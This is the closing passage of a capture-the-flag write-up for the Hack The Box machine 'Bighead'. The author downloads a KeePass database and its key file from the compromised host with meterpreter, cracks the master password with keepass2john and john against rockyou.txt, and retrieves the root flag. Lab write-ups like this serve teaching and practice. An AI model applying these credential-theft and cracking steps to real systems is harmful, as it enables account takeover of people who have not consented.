			<span class="nt">&lt;CustomOverrides</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/UrlSchemeOverrides&gt;</span>
		<span class="nt">&lt;AutoTypeAbortOnWindows</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;ProxyType&gt;</span>System<span class="nt">&lt;/ProxyType&gt;</span>
		<span class="nt">&lt;ProxyAuthType&gt;</span>Auto<span class="nt">&lt;/ProxyAuthType&gt;</span>
	<span class="nt">&lt;/Integration&gt;</span>
	<span class="nt">&lt;Custom</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/Configuration&gt;</span>
</code></pre></div></div>
<p>Exactly here :
<br><img src="/images/hackthebox/bighead/147.png" alt="" class="align-center"><br><br>
The key is <code class="language-plaintext highlighter-rouge">admin.png</code> in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Pictures\</code>. Let’s download it :
<br><img src="/images/hackthebox/bighead/148.png" alt="" class="align-center"><br><br>
admin.png :
<br><img src="/images/hackthebox/bighead/admin.png" alt="" class="align-center"><br><br>
I wanted to test the key (we still need the password) :
<br><img src="/images/hackthebox/bighead/149.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/150.png" alt="" class="align-center"><br><br>
I expected <code class="language-plaintext highlighter-rouge">The composite key is invalid</code> but instead of that I got <code class="language-plaintext highlighter-rouge">The file version is unsupported</code>. I tried many other version of <code class="language-plaintext highlighter-rouge">keepass</code> and got the same error. So I was sure that the file itself was corrupted (maybe because of <code class="language-plaintext highlighter-rouge">more</code>). I downloaded it again with <code class="language-plaintext highlighter-rouge">meterpreter</code> itself this time :
<br><img src="/images/hackthebox/bighead/151.png" alt="" class="align-center"><br><br>
Then I renamed it to <code class="language-plaintext highlighter-rouge">db.kdbx</code> :
<br><img src="/images/hackthebox/bighead/152.png" alt="" class="align-center"><br><br>
Let’s try again :
<br><img src="/images/hackthebox/bighead/153.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/154.png" alt="" class="align-center"><br><br>
Perfect ! Now we need the password. I used <code class="language-plaintext highlighter-rouge">keepass2john</code> to put the <code class="language-plaintext highlighter-rouge">kdbx</code> file in a <code class="language-plaintext highlighter-rouge">john</code> crackable format (we need the key to do that (<code class="language-plaintext highlighter-rouge">admin.png</code>))
<code class="language-plaintext highlighter-rouge">keepass2john -k admin.png &gt; db.john</code>
<br><img src="/images/hackthebox/bighead/155.png" alt="" class="align-center"><br><br>
Then I used <code class="language-plaintext highlighter-rouge">john</code> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> to crack it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt db.john
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/156.png" alt="" class="align-center"><br><br>
The password is <code class="language-plaintext highlighter-rouge">darkness</code>. Let’s try to open the database :
<br><img src="/images/hackthebox/bighead/157.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/158.png" alt="" class="align-center"><br><br>
Great ! double-click on <code class="language-plaintext highlighter-rouge">root.txt</code> and it will copy the flag into our clipboard :
<br><img src="/images/hackthebox/bighead/159.png" alt="" class="align-center"><br><br>
Let’s paste it :
<br><img src="/images/hackthebox/bighead/160.png" alt="" class="align-center"><br><br>
And finally we can say … We owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/irked/">Hack The Box - Irked</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-05-04T07:00:00+02:00">May 4, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/irked/" class="pagination--pager" title="Hack The Box - Irked
">Previous</a>
    
    
      <a href="/hack-the-box/lightweight/" class="pagination--pager" title="Hack The Box - Lightweight
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
